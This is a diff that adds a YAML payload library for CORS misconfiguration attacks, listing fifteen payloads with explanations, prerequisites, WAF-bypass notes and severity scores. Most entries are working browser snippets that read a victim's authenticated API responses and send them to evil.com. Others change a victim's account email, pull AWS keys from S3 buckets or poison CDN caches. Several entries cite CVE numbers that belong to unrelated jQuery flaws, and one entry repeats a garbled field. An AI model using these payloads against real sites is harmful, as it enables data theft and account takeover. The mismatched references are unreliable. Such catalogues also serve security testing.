@@ -1,0 +1,435 @@
+slug: cors
+name: CORS Misconfiguration
+owasp: A05:2021 – Security Misconfiguration
+description: 'Cross-Origin Resource Sharing (CORS) misconfigurations allow attacker-controlled websites to make authenticated
+  cross-origin requests to victim APIs, reading sensitive data that should be inaccessible due to the Same-Origin Policy.
+  Exploits range from simple data theft to full account takeover when cookies or auth headers are included in cross-origin
+  requests.
+
+  '
+severity_range:
+  low: CVSS 4.3 – information disclosure from public endpoints
+  high: CVSS 9.1 – authenticated data theft, account takeover
+references:
+- label: OWASP CORS Testing Guide
+  url: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-Side_Testing/07-Testing_Cross_Origin_Resource_Sharing
+- label: PortSwigger CORS Research
+  url: https://portswigger.net/web-security/cors
+groups:
+- slug: wildcard-cors
+  name: Wildcard and Permissive CORS
+  description: 'Exploiting Access-Control-Allow-Origin: * or overly broad origin allowlists'
+  difficulty: low
+  prerequisites:
+  - 'API returns Access-Control-Allow-Origin: * or reflects arbitrary origins'
+  payloads:
+  - id: cors-wild-001
+    title: Wildcard CORS data exfiltration via fetch
+    payload_string: 'fetch(''https://victim.com/api/user-data'', {credentials:''include''})
+
+      .then(r=>r.text()).then(d=>fetch(''https://evil.com/?d=''+btoa(d)))
+
+      '
+    how_it_works: 'When an API returns Access-Control-Allow-Origin: * and also returns Access-Control-Allow-Credentials: true
+      (which is technically invalid but some frameworks allow), any origin can read the response. The attacker hosts a page
+      that uses fetch() with credentials:include to make a request to the victim API. The response data is then exfiltrated
+      to the attacker''s server. This captures any sensitive data returned in the response including tokens, PII, and API
+      keys.
+
+      '
+    prerequisites:
+    - 'API uses Access-Control-Allow-Origin: * or reflects all origins'
+    - Victim user is authenticated to the target API
+    waf_bypass_notes: Exploit runs from attacker's domain; no server-side bypass needed
+    severity_context: CVSS 7.5 – authenticated data exfiltration via CORS misconfig
+    cve_refs: []
+    tags:
+    - cors
+    - wildcard
+    - data-exfiltration
+    - credentials
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cors-wild-002
+    title: CORS origin reflection exploit
+    payload_string: "# Malicious page at https://evil.com:\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://victim.com/api/account',\
+      \ true);\nxhr.withCredentials = true;\nxhr.onreadystatechange = function() {\n  if (xhr.readyState === 4) fetch('https://evil.com/steal?d='+btoa(xhr.responseText));\n\
+      };\nxhr.send();\n"
+    how_it_works: 'When a server responds with Access-Control-Allow-Origin: [Origin-header-value] and Access-Control-Allow-Credentials:
+      true, it reflects the attacker''s origin as trusted. Any attacker domain becomes a trusted origin. The attack requires
+      the victim to visit the attacker''s page while authenticated to the target. The XHR request includes the victim''s cookies,
+      the server responds with the victim''s data, and the response is forwarded to the attacker''s collection endpoint.
+
+      '
+    prerequisites:
+    - Server reflects Origin header in Access-Control-Allow-Origin
+    - 'Access-Control-Allow-Credentials: true is set'
+    waf_bypass_notes: XHR/fetch from attacker domain; server-side misconfig required
+    severity_context: CVSS 9.1 – full authenticated data access from any origin
+    cve_refs:
+    - CVE-2019-11358
+    tags:
+    - cors
+    - origin-reflection
+    - credentials
+    - data-exfiltration
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cors-wild-003
+    title: null origin bypass for sandboxed iframe
+    payload_string: '<iframe sandbox="allow-scripts" srcdoc=''
+
+      <script>
+
+      fetch("https://victim.com/api/secret",{credentials:"include"})
+
+      .then(r=>r.json()).then(d=>top.postMessage(JSON.stringify(d),"*"))
+
+      </script>''></iframe>
+
+      '
+    how_it_works: 'Some applications add ''null'' to their CORS allowlist for development purposes or to support file:// origins.
+      A sandboxed iframe has an origin of null. An attacker can embed a sandboxed iframe on their page that makes requests
+      to the victim API. If the victim''s API trusts the null origin, it responds with Access-Control-Allow-Origin: null,
+      and the sandboxed iframe can read the response and postMessage it to the parent attacker page.
+
+      '
+    prerequisites:
+    - API allowlists 'null' as an origin
+    - Victim user is authenticated
+    waf_bypass_notes: null origin is difficult to block at WAF level
+    severity_context: CVSS 7.5 – data exfiltration via sandboxed iframe null origin
+    cve_refs:
+    - CVE-2019-11358
+    tags:
+    - cors
+    - null-origin
+    - sandbox
+    - iframe
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cors-wild-004
+    title: Subdomain CORS bypass via subdomain takeover chain
+    payload_string: '# Take over vulnerable subdomain (e.g., old-staging.victim.com), then exploit CORS'
+    how_it_works: 'If an application''s CORS policy trusts all subdomains (*.victim.com or a regex like /victim\.com$/ that
+      can be bypassed), an attacker who controls any subdomain of victim.com can exploit the CORS policy. Subdomain takeovers
+      via unclaimed cloud resources (S3, Heroku, GitHub Pages) are common. Once the subdomain is controlled, the attacker
+      serves an exploit page and the victim''s API trusts the origin as legitimate.
+
+      '
+    prerequisites:
+    - CORS policy trusts all subdomains of target domain
+    - Attacker can take over a subdomain via dangling DNS
+    waf_bypass_notes: Requests appear to come from a legitimate subdomain
+    severity_context: CVSS 8.8 – combines subdomain takeover with CORS for data theft
+    cve_refs:
+    - CVE-2019-11358
+    tags:
+    - cors
+    - subdomain-takeover
+    - chained
+    - data-exfiltration
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cors-wild-005
+    title: CORS misconfiguration for credential theft via state-changing request
+    payload_string: "fetch('https://victim.com/api/change-email',{\n  method:'POST',credentials:'include',\n  headers:{'Content-Type':'application/json'},\n\
+      \  body:'{\"email\":\"attacker@evil.com\"}'\n})\n"
+    how_it_works: 'CORS misconfigurations on state-changing endpoints (POST, PUT, DELETE) are more impactful than read-only
+      data theft. If the API allows cross-origin POST with credentials, an attacker can change the victim''s email address,
+      password, or security settings. Combined with email-based account recovery, this achieves full account takeover without
+      reading any response data. The attack is similar to CSRF but works against APIs using JSON content types.
+
+      '
+    prerequisites:
+    - API allows credentialed cross-origin POST/PUT/DELETE
+    - 'Content-Type: application/json is in CORS allowed headers'
+    waf_bypass_notes: CORS-enabled APIs bypass SameSite=Lax cookie protection for cross-origin JSON requests
+    severity_context: CVSS 9.1 – account takeover via cross-origin state modification
+    cve_refs:
+    - CVE-2020-11022
+    tags:
+    - cors
+    - state-modification
+    - account-takeover
+    - json
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: cors-header-injection
+  name: CORS Header Manipulation
+  description: Bypassing CORS restrictions via header injection, regex flaws, or trusted-origin manipulation
+  difficulty: medium
+  prerequisites:
+  - CORS policy has bypassable validation logic
+  payloads:
+  - id: cors-hdr-001
+    title: Origin regex bypass via similar domain
+    payload_string: 'Origin: https://victimxcom.evil.com'
+    how_it_works: 'CORS validators using improperly anchored regex patterns (e.g., /victim.com/ without anchors) can be bypassed
+      by using a domain that matches the pattern but is attacker-controlled. The dot in a regex matches any character, so
+      victim.com matches victimxcom.evil.com. An attacker registers victimacom.com or a subdomain that matches the loose regex.
+      The server reflects this origin as trusted, enabling full CORS data theft.
+
+      '
+    prerequisites:
+    - CORS validator uses unanchored regex (e.g., /victim.com/)
+    - Attacker can register a domain matching the regex
+    waf_bypass_notes: Appears as Origin header; no payload in body
+    severity_context: CVSS 8.8 – origin validation bypass via regex flaw
+    cve_refs: []
+    tags:
+    - cors
+    - regex-bypass
+    - origin-validation
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cors-hdr-002
+    title: 'Pre-domain bypass: evil.victim.com'
+    payload_string: 'Origin: https://evil.victim.com'
+    how_it_works: 'If the CORS validator uses startsWith(''https://victim.com'') or includes the check victim.com in an allowlist
+      without full hostname validation, evil.victim.com may be accepted as a trusted origin. The validator sees that the origin
+      contains victim.com but doesn''t verify it as a known subdomain. An attacker who controls evil.victim.com (e.g., via
+      subdomain takeover or by registering it) can exploit this to bypass the CORS check.
+
+      '
+    prerequisites:
+    - CORS validator checks endsWith('.victim.com') without subdomain allowlist
+    - Attacker can take over a subdomain
+    waf_bypass_notes: Origin header manipulation; no special encoding
+    severity_context: CVSS 7.5 – origin validation bypass via subdomain
+    cve_refs:
+    - CVE-2019-11358
+    tags:
+    - cors
+    - subdomain
+    - origin-validation
+    - bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cors-hdr-003
+    title: CORS pre-flight bypass for simple requests
+    payload_string: "# Simple requests (GET/POST with simple headers) skip pre-flight:\nfetch('https://victim.com/api/data',{\n\
+      \  method:'GET',credentials:'include',\n  headers:{'Accept':'application/json'}\n})\n"
+    how_it_works: 'CORS pre-flight (OPTIONS) requests occur only for non-simple requests (custom headers, non-standard methods,
+      or JSON content-type). Simple GET and POST requests with basic headers do not trigger pre-flight. If an API returns
+      sensitive data via GET and has a CORS misconfiguration, no pre-flight is needed—the attacker directly reads the response.
+      Developers sometimes test pre-flight security but neglect simple request protection.
+
+      '
+    prerequisites:
+    - API endpoint accessible via simple GET/POST
+    - No pre-flight OPTIONS blocking the origin
+    waf_bypass_notes: No pre-flight request; no OPTIONS method to block
+    severity_context: CVSS 7.5 – CORS theft without pre-flight, bypassing OPTIONS-based defenses
+    cve_refs: []
+    tags:
+    - cors
+    - preflight-bypass
+    - simple-request
+    - get
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cors-hdr-004
+    title: CORS internal network pivot
+    payload_string: '# From victim''s browser, pivot to internal API:
+
+      fetch(''http://192.168.1.1/api/config'',{credentials:''include''})
+
+      .then(r=>r.json()).then(d=>exfil(d))
+
+      '
+    how_it_works: 'CORS misconfigurations on internal APIs (accessible only from the internal network or localhost) can be
+      exploited when an attacker causes a victim''s browser to make requests to those internal endpoints. The browser is inside
+      the network boundary and can access 192.168.x.x or localhost endpoints. If the internal service has a CORS misconfiguration,
+      the attacker''s external malicious page can read internal API responses via the victim''s browser.
+
+      '
+    prerequisites:
+    - Victim browser has access to internal network (office, VPN, intranet)
+    - Internal service has CORS misconfiguration
+    waf_bypass_notes: Internal network request from browser; external WAF cannot intercept
+    severity_context: CVSS 8.3 – internal network access via CORS-enabled browser pivot
+    cve_refs: []
+    tags:
+    - cors
+    - internal-network
+    - ssrf
+    - pivot
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cors-hdr-005
+    title: CORS cache poisoning for stored CORS bypass
+    payload_string: "GET /api/data HTTP/1.1\r\nOrigin: https://evil.com\r\nX-Forwarded-Host: evil.com\r\n"
+    how_it_works: 'When a CDN or reverse proxy caches responses including CORS headers, a CORS cache poisoning attack can
+      serve attacker-controlled CORS headers to all subsequent users. By making a request that causes an incorrect Access-Control-Allow-Origin
+      to be cached, the attacker ensures that subsequent legitimate users receive a response that allows their data to be
+      read from the attacker''s origin. This multiplies the impact of a single CORS misconfiguration across all cached users.
+
+      '
+    prerequisites:
+    - Response with CORS headers is cached by CDN/proxy
+    - Cache key does not include Origin header
+    waf_bypass_notes: Cache poisoning occurs at CDN level; hard to detect
+    severity_context: CVSS 8.8 – persistent CORS bypass affecting all cached users
+    cve_refs: []
+    tags:
+    - cors
+    - cache-poisoning
+    - cdn
+    - persistent
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: cors-advanced
+  name: Advanced CORS Exploitation
+  description: Chaining CORS with other vulnerabilities and exploiting misconfigurations in complex multi-origin setups
+  difficulty: expert
+  prerequisites:
+  - CORS misconfiguration combined with another vulnerability or complex setup
+  payloads:
+  - id: cors-adv-001
+    title: CORS + XSS chain for cookie exfiltration
+    payload_string: '# Stored XSS payload that exploits CORS to read admin page:
+
+      fetch(''/api/admin/users'',{credentials:''include''})
+
+      .then(r=>r.json())
+
+      .then(d=>new Image().src=''https://evil.com/?d=''+btoa(JSON.stringify(d)))
+
+      '
+    how_it_works: 'An XSS vulnerability on the victim domain combined with a CORS misconfiguration creates a powerful chain.
+      XSS bypasses SOP because the script runs on the victim''s origin. The XSS payload uses fetch() to access same-origin
+      admin endpoints the attacker would otherwise be blocked from reading. The data is exfiltrated to an external collector
+      via a beacon image request. This chain is used to read admin APIs from a low-privilege XSS context.
+
+      '
+    prerequisites:
+    - XSS on victim domain (any page)
+    - Target admin API accessible same-origin
+    waf_bypass_notes: XSS payload runs on victim origin; SOP fully bypassed
+    severity_context: CVSS 9.3 – lateral escalation from any XSS to admin data access
+    cve_refs:
+    - CVE-2020-11022
+    tags:
+    - cors
+    - xss
+    - chained
+    - admin
+    - exfiltration
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cors-adv-002
+    title: CORS misconfiguration on S3 bucket for credential theft
+    payload_string: '# S3 CORS config allows all origins:
+
+      fetch(''https://mybucket.s3.amazonaws.com/config.json'',{credentials:''include''})
+
+      .then(r=>r.json()).then(d=>exfil(d.aws_key,d.aws_secret))
+
+      '
+    how_it_works: 'AWS S3 buckets support custom CORS policies. Developers sometimes configure S3 CORS with AllowedOrigins:
+      * to enable static asset serving. If a config file, environment dump, or credentials file is accidentally stored publicly,
+      any page can read it. The impact escalates if the bucket stores JWT signing keys, AWS credentials, or API tokens. The
+      S3 service itself handles CORS, and misconfigured bucket policies are extremely common.
+
+      '
+    prerequisites:
+    - S3 bucket has overly permissive CORS policy
+    - Sensitive file accessible in the bucket
+    waf_bypass_notes: No WAF between browser and S3; CORS handled by AWS directly
+    severity_context: CVSS 9.1 – credential theft via permissive S3 CORS
+    cve_refs: []
+    tags:
+    - cors
+    - s3
+    - aws
+    - credential-theft
+    - cloud
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cors-adv-003
+    title: CORS bypass via trusted third-party OAuth provider
+    payload_string: '# If victim trusts all of auth-provider.com:
+
+      # Exploit XSS on any auth-provider.com page, then:
+
+      fetch(''https://victim.com/api/profile'',{credentials:''include''})
+
+      .then(r=>r.json()).then(exfil)
+
+      '
+    how_it_works: 'Applications that integrate with third-party OAuth providers sometimes add the entire OAuth provider domain
+      to their CORS allowlist. If an attacker finds an XSS on any page of the trusted OAuth provider, they can leverage that
+      XSS to make credentialed requests to the victim API. The victim''s CORS policy trusts the OAuth provider''s origin,
+      and the XSS gives the attacker code execution on that trusted origin.
+
+      '
+    prerequisites:
+    - Victim CORS policy trusts oauth-provider.com domain
+    - XSS exists on any page of oauth-provider.com
+    waf_bypass_notes: Requests originate from legitimately trusted domain
+    severity_context: CVSS 9.0 – chained XSS on trusted origin achieves CORS bypass
+    cve_refs: []
+    tags:
+    - cors
+    - oauth
+    - xss
+    - trusted-origin
+    - chained
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cors-adv-004
+    title: WebSocket CORS bypass via WS handshake Origin
+    payload_string: 'var ws = new WebSocket(''wss://victim.com/ws'');
+
+      ws.onopen = () => ws.send(JSON.stringify({type:''getSecrets''}));
+
+      ws.onmessage = (e) => exfil(e.data);
+
+      '
+    how_it_calls: 'WebSocket connections are not subject to CORS restrictions but servers can check the Origin header during
+      the HTTP upgrade handshake. If the server does not validate the Origin or trusts all origins, any page can establish
+      a WebSocket connection. The WS connection includes cookies, so the server treats the connection as authenticated. Unlike
+      HTTP CORS, there''s no pre-flight mechanism—the connection either succeeds or fails.
+
+      '
+    how_it_works: 'WebSocket connections bypass CORS because WS has its own origin-validation mechanism at the handshake level.
+      If the server doesn''t check Origin during the upgrade, any page can establish an authenticated WS connection using
+      the victim''s session cookies. The attacker can then send commands and receive responses as the victim over the WebSocket
+      channel.
+
+      '
+    prerequisites:
+    - WebSocket endpoint doesn't validate Origin header
+    - Session maintained via cookies
+    waf_bypass_notes: WebSocket upgrade requests may not be inspected by application-layer WAFs
+    severity_context: CVSS 8.8 – authenticated WebSocket access from any origin
+    cve_refs: []
+    tags:
+    - cors
+    - websocket
+    - origin-bypass
+    - authenticated
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cors-adv-005
+    title: CORS misconfiguration disclosure via OPTIONS probe
+    payload_string: "OPTIONS /api/users HTTP/1.1\r\nOrigin: https://evil.com\r\nAccess-Control-Request-Method: GET\r\n"
+    how_it_works: 'Probing with an OPTIONS request from an attacker-controlled origin reveals the server''s CORS policy. If
+      the response contains Access-Control-Allow-Origin: https://evil.com (reflecting the attacker''s origin), the misconfiguration
+      is confirmed. This reconnaissance step should precede the actual exploit. The OPTIONS probe itself causes no harm but
+      reveals whether the endpoint is exploitable without making a credentialed request.
+
+      '
+    prerequisites:
+    - CORS misconfiguration on the target endpoint
+    waf_bypass_notes: OPTIONS method often not inspected; useful for recon
+    severity_context: CVSS 2.6 – information disclosure of CORS policy; precursor to exploitation
+    cve_refs: []
+    tags:
+    - cors
+    - recon
+    - options
+    - discovery
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
